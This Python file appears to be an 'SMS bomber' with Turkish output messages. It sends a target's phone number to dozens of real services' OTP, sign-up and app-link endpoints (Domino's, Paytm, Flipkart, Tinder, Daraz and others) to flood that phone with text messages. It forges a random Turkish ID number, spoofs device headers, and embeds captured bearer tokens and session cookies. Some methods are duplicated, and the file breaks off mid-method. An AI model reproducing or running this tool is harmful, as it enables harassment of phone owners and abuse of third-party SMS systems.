import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style


class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")


    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
            
    #345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1

    #yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "X-Content-Language": "en", "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8", "Authorization": "Bearer ", "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)", "Accept-Encoding": "gzip, deflate, br"}
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
    
    #dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")

    # confirmtkt
    def Confirmtkt(self):
        try:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=90{self.phone}"
            r = requests.get(url, timeout=6)
            if "false" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> confirmtkt")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> confirmtkt")

    # justdial
    def Justdial(self):
        try:
            url = f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=90{self.phone}"
            r = requests.get(url, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> justdial")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> justdial")

    # frotels
    def Frotels(self):
        try:
            url = "https://www.frotels.com/appsendsms.php"
            data = {"mobno": f"90{self.phone}"}
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frotels")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frotels")

    # gapoon
    def Gapoon(self):
        try:
            url = "https://www.gapoon.com/userSignup"
            data = {
                "mobile": f"90{self.phone}",
                "email": "a@a.com",
                "name": "a"
            }
            r = requests.post(url, data=data, timeout=6)
            if "1" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gapoon")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gapoon")

    # housing
    def Housing(self):
        try:
            url = "https://login.housing.com/api/v2/send-otp"
            data = {"phone": f"90{self.phone}"}
            r = requests.post(url, json=data, timeout=6)
            if "Sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> housing")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> housing")

    # porter
    def Porter(self):
        try:
            url = "https://porter.in/restservice/send_app_link_sms"
            data = {
                "phone": f"90{self.phone}",
                "referrer_string": "",
                "brand": "porter"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> porter")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> porter")

    # cityflo
    def Cityflo(self):
        try:
            url = "https://cityflo.com/website-app-download-link-sms/"
            data = {"mobile_number": f"90{self.phone}"}
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> cityflo")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> cityflo")

    # nnnow
    def Nnnow(self):
        try:
            url = "https://api.nnnow.com/d/api/appDownloadLink"
            data = {"mobileNumber": f"90{self.phone}"}
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> nnnow")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> nnnow")

    # ajio
    def Ajio(self):
        try:
            url = "https://login.web.ajio.com/api/auth/signupSendOTP"
            data = {
                "firstName": "xxps",
                "login": "wiqpdl223@wqew.com",
                "password": "QASpw@1s",
                "genderType": "Male",
                "mobileNumber": f"90{self.phone}",
                "requestType": "SENDOTP"
            }
            r = requests.post(url, data=data, timeout=6)
            if "1" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ajio")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ajio")

    # happyeasygo
    def Happyeasygo(self):
        try:
            url = f"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=90%20{self.phone}"
            r = requests.get(url, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> happyeasygo")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> happyeasygo")

    # unacademy
    def Unacademy(self):
        try:
            url = "https://unacademy.com/api/v1/user/get_app_link/"
            data = {"phone": f"90{self.phone}"}
            r = requests.post(url, json=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> unacademy")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> unacademy")

    # treebo
    def Treebo(self):
        try:
            url = "https://www.treebo.com/api/v2/auth/login/otp/"
            data = {"phone_number": f"90{self.phone}"}
            r = requests.post(url, data=data, timeout=6)
            if "sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> treebo")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> treebo")

    # mobikwik
    def Mobikwik(self):
        try:
            url = "https://webapi.mobikwik.com/p/account/otp/cell/v2"
            data = {"cell": f"90{self.phone}"}
            headers = {"X-MClient": "0"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobikwik")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobikwik")

    # airtel
    def Airtel(self):
        try:
            url = f"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=90{self.phone}"
            r = requests.get(url, timeout=6)
            if "Success" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> airtel")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> airtel")

    # pharmeasy
    def Pharmeasy(self):
        try:
            url = "https://pharmeasy.in/api/auth/requestOTP"
            data = {"contactNumber": f"90{self.phone}"}
            r = requests.post(url, json=data, timeout=6)
            if "resendSmsCounter" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pharmeasy")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pharmeasy")

    # mylescars
    def Mylescars(self):
        try:
            url = "https://www.mylescars.com/usermanagements/chkContact"
            data = {"contactNo": f"90{self.phone}"}
            r = requests.post(url, data=data, timeout=6)
            if "success@::::" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mylescars")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mylescars")

    # grofers
    def Grofers(self):
        try:
            url = "https://grofers.com/v2/accounts/"
            data = {"user_phone": f"90{self.phone}"}
            headers = {"auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"}
            r = requests.post(url, data=data, headers=headers, timeout=6)
            if "We have sent" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> grofers")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> grofers")

    # dream11
    def Dream11(self):
        try:
            url = "https://api.dream11.com/sendsmslink"
            data = {
                "siteId": "1",
                "mobileNum": f"90{self.phone}",
                "appType": "androidfull"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dream11")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dream11")

    # cashify
    def Cashify(self):
        try:
            url = f"https://www.cashify.in/api/cu01/v1/app-link?mn=90{self.phone}"
            r = requests.get(url, timeout=6)
            if "Successfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> cashify")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> cashify")

    # paytm
    def Paytm(self):
        try:
            url = "https://commonfront.paytm.com/v4/api/sendsms"
            data = {
                "phone": f"90{self.phone}",
                "guid":"2952fa812660c58dc160ca6c9894221d"
            }
            r = requests.post(url, json=data, timeout=6)
            if "202" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> paytm")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> paytm")

    # flipkart
    def Flipkart(self):
        try:
            url = "https://www.flipkart.com/api/5/user/otp/generate"
            data = {"loginId": f"90{self.phone}"}
            headers = {
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                "Origin": "https://www.flipkart.com",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            r = requests.post(url, data=data, headers=headers, timeout=6)
            if "emailMask" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> flipkart")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> flipkart")

    # qlean
    def Qlean(self):
        try:
            url = "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code"
            data = {"phone": self.phone}
            r = requests.post(url, data=data, timeout=6)
            if "request_id" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> qlean")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> qlean")

    # mail.ru
    def Mailru(self):
        try:
            url = "https://cloud.mail.ru//api/v2/notify/applink"
            data = {
                "phone": self.phone,
                "api": "2",
                "email": "email",
                "x-email": "x-email"
            }
            r = requests.post(url, json=data, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mail.ru")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mail.ru")

    # gotinder
    def Gotinder(self):
        try:
            url = "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=tr"
            data = {"phone_number": self.phone}
            r = requests.post(url, data=data, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gotinder")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gotinder")

    # youla.ru
    def Yoularu(self):
        try:
            url = "https://youla.ru/web-api/auth/request_code"
            data = {"phone": self.phone}
            r = requests.post(url, json=data, timeout=6)
            if "code_length" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> youla.ru")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> youla.ru")

    # ivi.ru
    def Iviru(self):
        try:
            url = "https://api.ivi.ru/mobileapi/user/register/phone/v6"
            data = {"phone": self.phone}
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivi.ru")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivi.ru")

    # delitime.ru
    def Delitime(self):
        try:
            url = "https://api.delitime.ru/api/v2/signup"
            data = {
                "SignupForm[username]": self.phone,
                "SignupForm[device_type]": "3"
            }
            r = requests.post(url, data=data, timeout=6)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> delitime.ru")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> delitime.ru")

    # icq.com
    def Icq(self):
        try:
            url = "https://www.icq.com/smsreg/requestPhoneValidation.php"
            data = {
                "msisdn": self.phone,
                "locale": "en",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "45559"
            }
            r = requests.post(url, data=data, timeout=6)
            if "200" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> icq.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> icq.com")

    # bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")

    # suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
            
    # 345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
            else:
                raise
        except:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
            self.adet += 1
            
    # 3Via
    def Via(self):
        try:
            full_number = "90" + self.phone
            url = "https://3via.ly/api/client/login"
            data = {
                "msisdn": full_number,
                "device_type": "web"
            }
            r = requests.post(url, json=data, timeout=6)
            if "Otp Sent successfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3via.ly")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3via.ly")

    # Winmore
    def Winmore(self):
        try:
            full_number = "90" + self.phone
            url = "https://winmore.ly/api/p10/public/get_started"
            data = {
                "phone": full_number,
                "countryCode": "ly",
                "language": "en",
                "utm": {}
            }
            r = requests.post(url, json=data, timeout=6)
            if "SUBSCRIBED" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> winmore.ly")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> winmore.ly")

    # Lingo
    def Lingo(self):
        try:
            full_number = "90" + self.phone
            url = "https://lingo.ly/api/client/login"
            data = {
                "msisdn": full_number
            }
            r = requests.post(url, json=data, timeout=6)
            if "OTP Sended successfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> lingo.ly")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> lingo.ly")

    # Bekam
    def Bekam(self):
        try:
            full_number = "90" + self.phone
            url = "https://bekam.ly/api/client/login"
            data = {
                "msisdn": full_number
            }
            r = requests.post(url, json=data, timeout=6)
            if "OTP Send Successfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bekam.ly")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bekam.ly")

    # Daraz Nepal
    def DarazNepal(self):
        try:
            full_number = "90" + self.phone
            url = "https://member.daraz.com.np/user/api/sendVerificationSms"
            data = {
                "phone": full_number,
                "type": "OTP_REGISTER",
                "lzdAppVersion": "1.0",
                "ncToken": {
                    "csessionid": "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
                    "sig": "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
                    "token": "QPXW:1638536554908:0.22529358478093664"
                }
            }
            headers = {
                "X-CSRF-TOKEN": "57343b8557abe",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://member.daraz.com.np",
                "Referer": "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
                "Cookie": "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33"
            }
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if '"notSuccess":false' in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Daraz Nepal")
                self.adet += 1
            else:
                raise
        except:
